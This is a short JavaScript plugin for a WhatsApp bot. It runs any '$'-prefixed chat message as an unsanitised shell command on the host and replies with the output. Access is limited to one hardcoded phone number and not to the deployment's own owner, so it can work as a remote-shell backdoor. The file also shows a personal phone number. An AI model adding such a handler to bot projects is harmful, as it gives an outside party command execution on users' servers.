import cp, {exec as _exec} from 'child_process'; 
import {promisify} from 'util'; 

const exec = promisify(_exec).bind(cp); 

const handler = async (m, {conn, isOwner, command, text, usedPrefix, args, isROwner}) => { 
    const allowedUser = '34672982032@s.whatsapp.net';
    if (m.sender !== allowedUser) return; 

    if (global.conn.user.jid != conn.user.jid) return; 

    m.reply('╮──══─┈•⤣🖤⤤•┈─══─╭\n> | *◠ ⿻ جـاري الـتـنـفـيـذ\n╯──══─┈•⤣🖤⤤•┈─══─╰\n> 𝐿𝑈𝐹𝐹𝑌 𝐵𝛩𝑇⚡⃝⃕𝆺𝅥𝆹𝅥'); 

    let o; 
    try { 
        o = await exec(command.trimStart() + ' ' + text.trimEnd()); 
    } catch (e) { 
        o = e; 
    } finally { 
        const {stdout, stderr} = o; 
        if (stdout.trim()) m.reply(stdout); 
        if (stderr.trim()) m.reply(stderr); 
    } 
}; 

handler.customPrefix = /^[$]/; 
handler.command = new RegExp; 

export default handler;